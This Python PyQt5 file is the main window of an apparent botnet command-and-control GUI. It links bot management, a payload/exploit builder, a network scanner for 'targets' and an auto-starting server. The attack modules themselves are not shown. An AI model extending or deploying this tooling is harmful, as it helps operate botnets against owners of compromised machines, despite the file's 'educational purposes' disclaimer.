#!/usr/bin/env python3
"""
Main Window for C2C Botnet Management System
"""

import sys
import os
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import threading
import time

# Import components
from .components import (
    ModernSidebar, DashboardWidget, BotManagementWidget,
    MonitoringWidget, PayloadBuilderWidget, NetworkScannerWidget,
    LogsWidget, SettingsWidget
)

# Import core modules safely
def safe_import_core_modules():
    """Safely import core modules with fallbacks"""
    modules = {}
    
    try:
        from core.server import ThreadSafeServer
        modules['ThreadSafeServer'] = ThreadSafeServer
        print("Core server module imported successfully")
    except ImportError as e:
        print(f"Warning: Could not import ThreadSafeServer: {e}")
        modules['ThreadSafeServer'] = None
        
    try:
        from botnet.manager import BotnetManager
        modules['BotnetManager'] = BotnetManager
        print("Botnet manager module imported successfully")
    except ImportError as e:
        print(f"Warning: Could not import BotnetManager: {e}")
        modules['BotnetManager'] = None
        
    try:
        from core.exploit_builder import ExploitBuilder
        modules['ExploitBuilder'] = ExploitBuilder
        print("Exploit builder module imported successfully")
    except ImportError as e:
        print(f"Warning: Could not import ExploitBuilder: {e}")
        modules['ExploitBuilder'] = None
        
    try:
        from network.scanner import Scanner
        modules['Scanner'] = Scanner
        print("Network scanner module imported successfully")
    except ImportError as e:
        print(f"Warning: Could not import Scanner: {e}")
        modules['Scanner'] = None
        
    return modules


class MainWindow(QMainWindow):
    """Main window cho C2C Botnet Management System"""
    
    def __init__(self):
        super().__init__()
        
        # Import core modules
        self.core_modules = safe_import_core_modules()
        
        # Core components
        self.server = None
        self.botnet_manager = None
        self.exploit_builder = None
        self.network_scanner = None
        
        # UI Components
        self.sidebar = None
        self.stacked_widget = None
        self.pages = {}
        
        # Initialize UI
        self.init_core_components()
        self.init_ui()
        self.init_background_tasks()
        
        # Auto-start server
        self.auto_start_server()
        
    def init_core_components(self):
        """Khởi tạo các core components"""
        try:
            # Initialize components if available
            if self.core_modules['ThreadSafeServer']:
                self.server = self.core_modules['ThreadSafeServer']()
                
            if self.core_modules['BotnetManager']:
                self.botnet_manager = self.core_modules['BotnetManager']()
                
            if self.core_modules['ExploitBuilder']:
                self.exploit_builder = self.core_modules['ExploitBuilder']()
                
            if self.core_modules['Scanner']:
                self.network_scanner = self.core_modules['Scanner']()
                
            print("Core components initialized successfully")
        except Exception as e:
            print(f"Error initializing core components: {e}")
    
    def init_ui(self):
        """Khởi tạo giao diện người dùng"""
        self.setWindowTitle("C2C Botnet Management Platform")
        self.setWindowIcon(QIcon("assets/icon.png") if os.path.exists("assets/icon.png") else QIcon())
        self.setGeometry(100, 100, 1400, 900)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QHBoxLayout()
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        # Sidebar
        self.sidebar = ModernSidebar()
        self.sidebar.page_changed.connect(self.change_page)
        main_layout.addWidget(self.sidebar)
        
        # Stacked widget for pages
        self.stacked_widget = QStackedWidget()
        self.init_pages()
        main_layout.addWidget(self.stacked_widget)
        
        central_widget.setLayout(main_layout)
        
        # Status bar
        self.init_status_bar()
        
        # Menu bar
        self.init_menu_bar()
        
        # Apply theme
        self.apply_theme()
        
    def init_pages(self):
        """Khởi tạo các pages/tabs"""
        try:
            # Dashboard
            self.pages['dashboard'] = DashboardWidget(
                server=self.server,
                botnet_manager=self.botnet_manager
            )
            
            # Bot Management
            self.pages['bots'] = BotManagementWidget(
                botnet_manager=self.botnet_manager
            )
            
            # Monitoring
            self.pages['monitoring'] = MonitoringWidget(
                server=self.server
            )
            
            # Payload Builder
            self.pages['payload'] = PayloadBuilderWidget(
                exploit_builder=self.exploit_builder
            )
            
            # Network Scanner
            self.pages['scanner'] = NetworkScannerWidget(
                scanner=self.network_scanner
            )
            
            # Logs
            self.pages['logs'] = LogsWidget()
            
            # Settings
            self.pages['settings'] = SettingsWidget()
            
            # Add pages to stacked widget
            for page_name, page_widget in self.pages.items():
                self.stacked_widget.addWidget(page_widget)
                
            print(f"Initialized {len(self.pages)} pages")
            
        except Exception as e:
            print(f"Error initializing pages: {e}")
    
    def init_status_bar(self):
        """Khởi tạo status bar"""
        self.status_bar = self.statusBar()
        
        # Server status
        self.server_status = QLabel("Server: Offline")
        self.server_status.setStyleSheet("""
            QLabel {
                color: #e74c3c;
                font-weight: bold;
                padding: 5px;
            }
        """)
        
        # Bot count
        self.bot_count = QLabel("Bots: 0")
        self.bot_count.setStyleSheet("""
            QLabel {
                color: #3498db;
                font-weight: bold;
                padding: 5px;
            }
        """)
        
        # Time
        self.time_label = QLabel()
        self.time_label.setStyleSheet("""
            QLabel {
                color: #2c3e50;
                font-weight: bold;
                padding: 5px;
            }
        """)
        
        # Add to status bar
        self.status_bar.addWidget(self.server_status)
        self.status_bar.addWidget(self.bot_count)
        self.status_bar.addPermanentWidget(self.time_label)
        
        # Timer để update status
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_status_bar)
        self.status_timer.start(1000)  # Update mỗi giây
        
    def init_menu_bar(self):
        """Khởi tạo menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('File')
        
        new_action = QAction('New Session', self)
        new_action.setShortcut('Ctrl+N')
        new_action.triggered.connect(self.new_session)
        
        save_action = QAction('Save Session', self)
        save_action.setShortcut('Ctrl+S')
        save_action.triggered.connect(self.save_session)
        
        exit_action = QAction('Exit', self)
        exit_action.setShortcut('Ctrl+Q')
        exit_action.triggered.connect(self.close)
        
        file_menu.addAction(new_action)
        file_menu.addAction(save_action)
        file_menu.addSeparator()
        file_menu.addAction(exit_action)
        
        # Server menu
        server_menu = menubar.addMenu('Server')
        
        start_server_action = QAction('Start Server', self)
        start_server_action.triggered.connect(self.start_server)
        
        stop_server_action = QAction('Stop Server', self)
        stop_server_action.triggered.connect(self.stop_server)
        
        restart_server_action = QAction('Restart Server', self)
        restart_server_action.triggered.connect(self.restart_server)
        
        server_menu.addAction(start_server_action)
        server_menu.addAction(stop_server_action)
        server_menu.addAction(restart_server_action)
        
        # Tools menu
        tools_menu = menubar.addMenu('Tools')
        
        console_action = QAction('Console', self)
        console_action.triggered.connect(self.open_console)
        
        settings_action = QAction('Settings', self)
        settings_action.triggered.connect(self.open_settings)
        
        tools_menu.addAction(console_action)
        tools_menu.addAction(settings_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        
        about_action = QAction('About', self)
        about_action.triggered.connect(self.show_about)
        
        help_action = QAction('Help', self)
        help_action.triggered.connect(self.show_help)
        
        help_menu.addAction(about_action)
        help_menu.addAction(help_action)
        
    def apply_theme(self):
        """Áp dụng theme cho ứng dụng"""
        self.setStyleSheet("""
            QMainWindow {
                background-color: #ecf0f1;
            }
            
            QMenuBar {
                background-color: #34495e;
                color: white;
                font-weight: bold;
                border: none;
            }
            
            QMenuBar::item {
                background-color: transparent;
                padding: 8px 12px;
            }
            
            QMenuBar::item:selected {
                background-color: #3498db;
                border-radius: 4px;
            }
            
            QMenu {
                background-color: white;
                border: 2px solid #bdc3c7;
                border-radius: 5px;
            }
            
            QMenu::item {
                padding: 8px 20px;
                border: none;
            }
            
            QMenu::item:selected {
                background-color: #3498db;
                color: white;
            }
            
            QStatusBar {
                background-color: #34495e;
                color: white;
                border-top: 1px solid #2c3e50;
            }
        """)
        
    def init_background_tasks(self):
        """Khởi tạo background tasks"""
        # Update timer cho real-time data
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_real_time_data)
        self.update_timer.start(5000)  # Update mỗi 5 giây
        
    def auto_start_server(self):
        """Tự động khởi động server"""
        def start_in_background():
            try:
                if self.server and hasattr(self.server, 'running') and not self.server.running:
                    print("Starting server automatically...")
                    self.server.start()
                    print("Server started successfully")
            except Exception as e:
                print(f"Error auto-starting server: {e}")
                
        # Start server in background thread
        threading.Thread(target=start_in_background, daemon=True).start()
        
    def change_page(self, page_name):
        """Thay đổi page hiện tại"""
        if page_name in self.pages:
            page_widget = self.pages[page_name]
            index = self.stacked_widget.indexOf(page_widget)
            if index >= 0:
                self.stacked_widget.setCurrentIndex(index)
                print(f"Changed to page: {page_name}")
                
    def update_status_bar(self):
        """Cập nhật status bar"""
        # Update time
        current_time = time.strftime("%H:%M:%S")
        self.time_label.setText(f"Time: {current_time}")
        
        # Update server status
        if self.server and hasattr(self.server, 'running') and self.server.running:
            self.server_status.setText("Server: Online")
            self.server_status.setStyleSheet("""
                QLabel {
                    color: #27ae60;
                    font-weight: bold;
                    padding: 5px;
                }
            """)
        else:
            self.server_status.setText("Server: Offline")
            self.server_status.setStyleSheet("""
                QLabel {
                    color: #e74c3c;
                    font-weight: bold;
                    padding: 5px;
                }
            """)
            
        # Update bot count
        if self.botnet_manager and hasattr(self.botnet_manager, 'get_bots'):
            try:
                bot_count = len(self.botnet_manager.get_bots())
                self.bot_count.setText(f"Bots: {bot_count}")
            except:
                self.bot_count.setText("Bots: 0")
        else:
            self.bot_count.setText("Bots: 0")
                
    def update_real_time_data(self):
        """Cập nhật dữ liệu real-time cho các pages"""
        current_page = self.stacked_widget.currentWidget()
        if hasattr(current_page, 'update_data'):
            try:
                current_page.update_data()
            except Exception as e:
                print(f"Error updating page data: {e}")
            
    # Menu actions
    def new_session(self):
        """Tạo session mới"""
        reply = QMessageBox.question(
            self, 'New Session',
            'Are you sure you want to start a new session?\nAll current data will be lost.',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            print("Starting new session...")
            
    def save_session(self):
        """Lưu session hiện tại"""
        filename, _ = QFileDialog.getSaveFileName(
            self, 'Save Session', 
            f'session_{time.strftime("%Y%m%d_%H%M%S")}.json',
            'JSON Files (*.json)'
        )
        
        if filename:
            print(f"Saving session to: {filename}")
            
    def start_server(self):
        """Khởi động server"""
        try:
            if self.server and hasattr(self.server, 'running') and not self.server.running:
                self.server.start()
                QMessageBox.information(self, 'Server', 'Server started successfully!')
            else:
                QMessageBox.warning(self, 'Server', 'Server is already running!')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to start server:\n{str(e)}')
            
    def stop_server(self):
        """Dừng server"""
        try:
            if self.server and hasattr(self.server, 'running') and self.server.running:
                self.server.stop()
                QMessageBox.information(self, 'Server', 'Server stopped successfully!')
            else:
                QMessageBox.warning(self, 'Server', 'Server is not running!')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to stop server:\n{str(e)}')
            
    def restart_server(self):
        """Restart server"""
        try:
            if self.server and hasattr(self.server, 'running'):
                if self.server.running:
                    self.server.stop()
                    time.sleep(1)
                self.server.start()
                QMessageBox.information(self, 'Server', 'Server restarted successfully!')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to restart server:\n{str(e)}')
            
    def open_console(self):
        """Mở console window"""
        QMessageBox.information(self, 'Console', 'Console feature coming soon!')
        
    def open_settings(self):
        """Mở settings dialog"""
        self.change_page('settings')
        
    def show_about(self):
        """Hiển thị about dialog"""
        QMessageBox.about(self, 'About', """
        <h3>C2C Botnet Management Platform</h3>
        <p>Version 1.0.0</p>
        <p>A comprehensive botnet management system for security research and education.</p>
        <p><b>For educational and research purposes only!</b></p>
        """)
        
    def show_help(self):
        """Hiển thị help"""
        QMessageBox.information(self, 'Help', """
        <h3>Quick Help</h3>
        <p><b>Dashboard:</b> Overview of system status</p>
        <p><b>Bot Management:</b> Control connected bots</p>
        <p><b>Monitoring:</b> Real-time system monitoring</p>
        <p><b>Payload Builder:</b> Create custom payloads</p>
        <p><b>Network Scanner:</b> Scan and discover targets</p>
        <p><b>Logs:</b> View system logs and activity</p>
        <p><b>Settings:</b> Configure system settings</p>
        """)
        
    def closeEvent(self, event):
        """Xử lý khi đóng ứng dụng"""
        reply = QMessageBox.question(
            self, 'Exit',
            'Are you sure you want to exit?\nServer will be stopped.',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            # Stop server
            if self.server and hasattr(self.server, 'running') and self.server.running:
                try:
                    self.server.stop()
                    print("Server stopped")
                except:
                    pass
                    
            print("Application closing...")
            event.accept()
        else:
            event.ignore()


def main():
    """Main function để test"""
    app = QApplication(sys.argv)
    app.setApplicationName("C2C Botnet Management")
    app.setApplicationVersion("1.0.0")
    
    # Set application icon
    if os.path.exists("assets/icon.png"):
        app.setWindowIcon(QIcon("assets/icon.png"))
    
    window = MainWindow()
    window.show()
    
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()